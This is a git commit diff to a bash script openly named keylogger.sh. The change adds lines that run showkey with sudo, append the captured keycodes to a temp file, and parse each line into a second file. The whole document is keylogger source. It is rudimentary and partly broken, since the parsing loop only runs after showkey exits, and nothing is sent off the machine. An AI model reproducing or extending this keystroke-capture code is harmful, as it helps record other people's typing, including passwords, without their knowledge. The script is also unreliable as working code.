0f78720bfb4a19afc6fd61a932434a89c9281ea1
semabraham <45659802+semabraham@users.noreply.github.com>
2022-02-17 00:36:12 +0700

    Update keylogger.sh

--- keylogger.sh
+++ keylogger.sh
@@ -1,5 +1,13 @@
 #!/bin/bash
 
+filename='tmp/text1.txt'
+
+sudo showkey >> tmp/text1.txt
+
+while read line;
+do echo ${line:9:2} >> tmp/text2.txt
+
+done < $filename
 
 /usr/bin/showkey -a </dev/stdin
 
